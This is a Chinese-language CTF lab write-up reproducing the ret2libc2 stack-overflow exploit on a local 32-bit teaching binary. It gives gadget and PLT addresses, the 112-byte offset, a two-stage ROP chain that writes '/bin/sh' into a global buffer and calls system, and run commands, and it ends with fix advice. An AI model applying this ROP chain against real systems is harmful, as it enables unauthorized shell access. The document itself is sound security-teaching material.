# ret2libc2 复现记录

本记录复现课程表格中的 `ret2libc2`：先自行把 `/bin/sh` 写入可写内存，再调用程序已有的 `system`。

配套程序：

```text
/home/xyx/Desktop/ex2/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2libc/ret2libc2/ret2libc2
```

这是一个本地教学二进制，只用于理解栈溢出和 ret2libc。

## 1. 程序分析

程序只有一个栈上的 `buf1`，并通过 `gets(buf1)` 接收输入。程序没有直接保存 `/bin/sh` 字符串，但有一个全局可写数组：

```c
char buf2[100];
```

因此利用分为两步：

1. 用第一条 ROP 链调用 `gets(buf2)`，从第二行输入把 `/bin/sh` 写到 `buf2`。
2. 返回到已有的 `system@plt`，把 `buf2` 作为参数调用 `system(buf2)`。

## 2. 防护检查

```bash
cd /home/xyx/Desktop/ex2/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2libc/ret2libc2
chmod +x ret2libc2
file ret2libc2
checksec --file=ret2libc2
```

关键结果：

```text
ELF 32-bit LSB executable, Intel 80386
No canary found
NX enabled
No PIE (0x8048000)
Partial RELRO
```

关键地址：

| 作用 | 地址 |
| --- | --- |
| `gets@plt` | `0x08048460` |
| `system@plt` | `0x08048490` |
| `pop ebx; ret` | `0x0804843d` |
| 全局可写数组 `buf2` | `0x0804a080` |
| `gets` 目标 `buf1` | `esp + 0x1c` |

地址可以用以下命令复核：

```bash
nm -n ret2libc2 | rg ' buf2| main'
objdump -d -Mintel ret2libc2 | sed -n '/<main>:/,/^$/p'
python3 - <<'PY'
from pwn import *
e = ELF('./ret2libc2', checksec=False)
for address in [0x08048460, 0x08048490, 0x0804843d, 0x0804a080]:
    print(hex(address), e.read(address, 8).hex())
PY
```

`0x0804843d` 处的机器码以 `pop ebx; ret` 开始，因此可以把 `buf2` 地址作为 `gets` 的参数从栈上取出，并继续转到 `system`。

## 3. 偏移计算

用 cyclic pattern 覆盖返回地址后，GDB 显示 EIP 为 `0x62616164`：

```bash
python3 - <<'PY'
from pwn import *
print(cyclic_find(0x62616164, n=4))
PY
```

输出：

```text
112
```

所以 `buf1` 起点到保存返回地址的偏移是 112 字节。

## 4. 两阶段 ROP 链

第一阶段覆盖后的栈布局如下：

```text
112 字节填充
0x08048460                gets@plt
0x0804843d                pop ebx; ret
0x0804a080                gets 的参数：buf2
0x08048490                system@plt
0x42424242                system 的返回地址，占位
0x0804a080                system 的参数：buf2
```

执行过程：

1. `main` 返回到 `gets@plt`。
2. `gets` 从第二行读入 `/bin/sh`，写入 `0x0804a080`。
3. `gets` 返回到 `pop ebx; ret`，该 gadget 消耗 `buf2` 并转到 `system@plt`。
4. `system` 从栈上取出最后一个 `buf2` 地址，执行 `system("/bin/sh")`。

这就是“自行写入 `/bin/sh`，再调用 `system`”；整个过程没有注入或执行 shellcode。

## 5. 复现步骤

```bash
cd /home/xyx/Desktop/ret2libc2_repro
python3 exploit.py
```

进入交互 shell 后输入：

```text
echo RET2LIBC2_OK
```

成功输出：

```text
RET2LIBC2_OK
```

也可以直接运行题库自带脚本：

```bash
cd /home/xyx/Desktop/ex2/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2libc/ret2libc2
chmod +x ret2libc2
printf 'echo RET2LIBC2_OK\n' | python3 exploit.py
```

## 6. 修复建议

漏洞根源是 `gets` 的无界写入，应改为带长度限制的 `fgets`，并启用栈 canary、PIE、RELRO 和 NX。NX 无法阻止 ret2libc，因为攻击者复用了已有代码；输入边界检查仍是根本修复。
